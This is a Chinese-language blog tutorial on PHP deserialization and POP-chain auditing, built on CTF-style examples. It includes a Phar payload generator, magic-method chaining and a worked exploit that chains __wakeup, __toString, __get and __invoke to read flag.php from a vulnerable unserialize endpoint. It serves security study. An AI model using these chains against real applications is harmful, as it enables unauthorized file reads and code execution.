---
title: 从反序列化、POP链看PHP代码审计
date: 2020-03-18 18:35:21
tags:
    - pop
categories:
    - web
keywords: 
    - pop,unserialize
toc: true
---


很长时间为php反序列化和pop链的各种题目所困惑，一直想系统地总结和巩固一下，于是就有了本文。文章以POP链、反序列化为切入点，希望详细论述一些代码审计的方法论。

先放上全文思路图

![](https://ww1.yunjiexi.club/2020/03/16/GQtYq.png)

主要内容分为三个部分：

1. 前置知识补漏
2. 漏洞利用链方法论
3. 实践工具和技巧

**基础知识参考文章**

[比较全面且基础的文章](https://xz.aliyun.com/t/3674#toc-9) 且讲解了session的序列化器不同引发的漏洞

[从LCTF WEB签到题看PHP反序列化](https://xz.aliyun.com/t/3336)

[php反序列化pop链一则](https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html)

**比较困难的部分是实际的CMS审计**

[Thinkphp 5.1.反序列化漏洞详解](https://paper.seebug.org/1040/)



## 前置知识

### 序列化和序列化

为了传输对象，我们把类变成一个有结构的字符串，就称为序列化。把这个字符串变为原来的对象，就称为反序列化。我们只能保存对象的属性，而不能保存对象的方法。

为了能够unserialize()一个对象，这个对象的类必须已经定义过，传统编程需要很多include和require。后来出现了autoloading技术，自动导入使用的类。

要提一下Composer,这是一个php的包管理工具,同时他还能自动导入依赖库中定义的类。这样一来 unserialize() 函数也就能使用所有依赖库中的类了,攻击面增大不少。

1. Composer配置的依赖库存储在vendor目录下
2. 如果要使用Composer的自动类加载机制,只需要在php文件的开头加上` require DIR . '/vendor/autoload.php';`

**反序列化的漏洞**：CVE-2016-7124

触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。当序列化字符串中表示对象个数的值大于真实的属性个数时，会跳过__wakeup()的执行。

### 魔术方法

魔术方法是在一定情况下会被类自动调用的方法。我们经常通过控制属性，到达一些魔术方法，进而一步步到达漏洞函数。下面列出了方法和被调用的时机

```php
__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问(不存在)的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当脚本尝试将对象调用为函数时触发
```

### Phar

参考资料：

+ [phar详解+稍复杂利用实例](https://paper.seebug.org/680/) from seebug

PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。phar文件会以序列化的形式存储用户自定义的meta-data，这使得文件函数读取phar格式的文件时，就会触发unserialize。这样子我们就相当于利用好多文件操作函数，达到了unserialize函数的目的。下面是受到影响的文件操作函数，非常多。

![](https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s)

但phar也有利用的条件：

1. phar文件要能够上传到服务器端。
2. 要有可用的魔术方法作为“跳板”。
3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤。

下面简单介绍Phar格式的结构：

![](https://ww1.yunjiexi.club/2020/03/15/GGiUt.png)

四部分。首先是**标志位**：格式为`xxx`，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。前面内容不限，因此我们经常可以文件头伪造。

接下来是**menifest**，phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以*序列化*的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。

![](https://images.seebug.org/content/images/2018/08/24388aaa-6ea4-4856-8fb1-fbf29deb5dca.png-w331s)

再接下是被压缩文件的内容，无关紧要。

最后是签名，放在文件末尾。

![](https://images.seebug.org/content/images/2018/08/f87194d9-81d6-4786-9339-8a7d4ac596d5.png-w331s)

生成phar文件的脚本：

```php
<?php
    class MyObject {
        //你的逻辑
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

    /*
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER();?>");
    这样也完全没问题
    */
    
    $o = new MyObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件，注意！不添加会导致无法生成phar
    //签名自动计算
    $phar->stopBuffering();
?>

```

调用也很容易

```php
$filename = 'phar://phar.phar/a_random_string';
    file_exists($filename);//文件函数即可
```

### 命名空间

在通常的PHP开发中，除了使用自己的代码以外，往往会使用很多其他的PHP组件。这些组件代码可能会使用相同的类名、接口名、函数或者常量名等，如果不使用命名空间就会导致命名冲突，使PHP执行出错。而将代码放到各自唯一的命名空间中，我们的代码就可以和其他开发者使用相同的类名、接口名、函数或者常量名等。

我们只要知道，在构造利用类时，顺便加上它所在的命名空间就好了。

```php
<?php
namespace mainspace/subspace;
```

还要注意的是，在命名空间中使用全局类，需要在类名前加上`/`符，否则会出错。

```php
<?php
namespace A\B\C;
class Exception extends \Exception {}

$a = new Exception('hi'); // $a 是类 A\B\C\Exception 的一个对象
$b = new \Exception('hi'); // $b 是类 Exception 的一个对象

$c = new ArrayObject; // 致命错误, 找不到 A\B\C\ArrayObject 类
?>
```

## 漏洞利用链方法论

先阐述很重要的POP链利用，然后介绍一般的漏洞利用方法。

### POP链实例

如果直接介绍POP链的定义，相信会很抽象，很难理解。我们先通过简单的例子感性认识一下

```php
<?php
class User{
    public $name;
    function __destruct(){
        if($this->name == "admin"){
            echo "\nflag{This_is_flag}";
        }
    }
}

class Group{
    public $user;
    //...
}

class Coll{
    public $group;
    //...
}
?>
```

这是三个类的定义，它们是递进依赖的关系。接下来在代码中添加以下几行

```php
//声明
$c = new User();
$b = new Group();
$a = new Coll();
//利用
$c->name = "admin";
$b->user = $c;
$a->group = $b;
//获得exp
echo serialize($a);
```

输出了`O:4:"Coll":1:{s:5:"group";O:5:"Group":1:{s:4:"user";O:4:"User":1:{s:4:"name";s:5:"admin";}}}`和应有的flag（因为执行完脚本自动destruct）。而如果转而添加以下几行

```php
$string = 'O:4:"Coll":1:{s:5:"group";O:5:"Group":1:{s:4:"user";O:4:"User":1:{s:4:"name";s:5:"admin";}}}';
$Coll = unserialize($string);
```

也可以得到flag，这就是一次简单的POP链利用过程了。

### POP链

POP是面向属性编程的意思。在以上操作中，我们利用unserialize函数，控制了一些相互依赖的对象的属性。

unserialize函数上面已经讲过了，它的本质是：**控制了对象的所有属性**，即使这个属性是另一个对象，也可以控制。

为了做到控制某个属性，控制了一层又一层的对象，连起来像链条一样。就如上例，我们**意图**是控制`name`，为了演示，通过`Coll->Group->User->name`进行了控制。这就是POP链的构造。其实很简单。

### 相同函数名的漏洞利用

这是一个扩展利用链的方法。

有时候漏洞函数在一个类的普通方法中，我们正常是做不到以可控变量访问此方法的。这个时候我们可以通过可以控制的类，与漏洞函数所在方法同名的方法来执行。例子如下

```php
<?php

class Main{
    public $classObj;
    function __construct(){
        $this->classObj = new Accessable();
    }
    function __destruct(){
        $this->classObj->action();
    }
}

class NotAccessable{
    function action(){
        echo "flag{this_is_flag}";
    }
}

class Accessable{
    function action(){
        echo "flag is not here";
    }
}

?>
```

注意到action方法重名，可以构造exp

```php
<?php

class Main{
    public $classObj;
    function __construct(){
        $this->classObj = new NotAccessable();
    }
}

class NotAccessable{
}

$str = serialize(new Main());
echo $str;// O:4:"Main":1:{s:8:"classObj";O:13:"NotAccessable":0:{}}
?>
```

可以看到成功执行。

![](https://ww1.yunjiexi.club/2020/03/16/GQmWE.png)

### 利用链

在代码审计的过程中，我们穿越在复杂的逻辑迷宫里。当我们发现了漏洞函数，一点点的观察：哪里调用了这个函数？可不可以最终控制函数的参数？一点点地溯源下去，最终发现了我们可以控制的输入点。在此过程中，用到的函数层层调用像链条一样连接起来，便是利用链。

我认为利用链有三要素：可控点，中间过滤，利用点。

可控点和利用点都很容易理解，重要的是中间过滤，我们常常需要把这些过滤记下来，在可控点进行bypass。利用点决定了我们能**做什么**，中间过滤决定了要**怎么做**，而可控点则是点出了我们**在哪做**。实际操作的时候，我们只要明确这三个问题，就不会迷失方向。


## 实践与技巧

如果利用链可以从**谁能调用我？**和**我能调用谁？**两个角度出发，从后往前+从前往后一起遍历，最后中间相遇。

审计CMS时，则往往是从类中寻找可以利用的漏洞，然后直接全局寻找能够触发unserialize的代码。

### 中规中矩的题目

```php
<?php
//flag is in flag.php
error_reporting(1);
class Read {
    public $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));//[TARGET 1]
        return $text;
    }
    public function __invoke(){
        $content = $this->file_get($this->var);
        echo $content;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file='index.php')
    {
        $this->source = $file;
        echo $this->source.'Welcome'."<br>";
    }
    public function __toString()
    {
        return $this->str['str']->source;
    }

    public function _show()
    {
        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->source)) {
            die('hacker');
        } else {
            highlight_file($this->source); //[TARGET 2]
        }

    }

    public function __wakeup()
    {
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $p;
    public function __construct()
    {
        $this->p = array();
    }

    public function __get($key)
    {
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['hello']))
{
    unserialize($_GET['hello']);//[START]
}
else
{
    $show = new Show('pop3.php');
    $show->_show();
}
```

我标注了target的两处便是最终要利用的函数，start的一处就是我们可控输入点。

先逆推考察Target 1

如何到达最后的`file_get_content(可控)`？需要到达`file_get(可控)`，需要`__invoke()且$var可控`。如何调用invoke？需要把对象当做函数调用。于是我们就要寻找办法做到这一点：

```
... 把一个Read()的对象作为函数调用且可控$var -> __invoke() 且可控$var -> file_get(可控) -> file_get_content(可控)【Finish】
```

哪里可以函数调用对象？当然是`Test->__get()`。`__get()`可用于从不存在的属性读取数据，那么哪里可以调用get？不太好找了。我们先放一放

再从start顺推考察。`unserialize()`会调用`__wakeup`方法，且类一切参数可控。而`Show->__wakeup()`中的preg_match会调用类的`toString`，Show类中恰有toString。跟进方法，发现它想要获得类的属性，那就有可能出现属性不存在的问题。这个过程如下

```
【Start】->unserialize(对象属性全可控) -> Show的wakeup()且source可控 -> Show的source的toString且source可控 -> Show的source的str['str']的__get()方法 -> ...
```

至此，我们发现前后已经连接上了。

```
【Start】->unserialize() -> Show的wakeup() -> Show的source的toString -> Show的source的str['str']的__get() -> 函数调用了Read()的一个对象 ->Read的__invoke()  -> file_get() -> file_get_content()【Finish】
```

那么就可以构造POP链：

```php
<?php 

class Show{
	public $source;
	public $str;
}

class Test{
	public $p;
}

class Read{
	public $var = "flag.php";
}

$s = new Show();
$t = new Test();
$r = new Read();

$t->p = $r;
$s->str["str"] = $t;
$s->source = $s;
var_dump(serialize($s));

 ?>
```
